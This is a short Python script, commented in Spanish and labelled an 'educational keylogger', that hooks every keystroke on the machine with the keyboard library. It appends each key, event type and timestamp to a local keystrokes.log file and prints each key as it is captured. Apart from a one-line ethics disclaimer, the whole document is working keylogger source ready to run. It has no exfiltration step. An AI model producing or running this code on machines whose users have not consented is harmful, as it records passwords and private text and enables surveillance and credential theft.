
import keyboard
import time
from datetime import datetime

def educational_keylogger():
    log_file = "keystrokes.log"
    print("⌨️  Keylogger educativo activado... (Ctrl+C para detener)")
    print("⚠️  SOLO USAR PARA APRENDIZAJE ÉTICO")
    
    def on_key_event(event):
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        key_data = f"[{timestamp}] Tecla: {event.name} | Evento: {event.event_type}\n"
        
        with open(log_file, "a") as f:
            f.write(key_data)
        
        print(f"📝 Registrado: {event.name}")
    
    # Registrar eventos de teclado
    keyboard.hook(on_key_event)
    
    try:
        # Mantener el script corriendo
        keyboard.wait()
    except KeyboardInterrupt:
        print("\n👋 Keylogger detenido")
        print(f"📄 Log guardado en: {log_file}")

if __name__ == "__main__":
    educational_keylogger()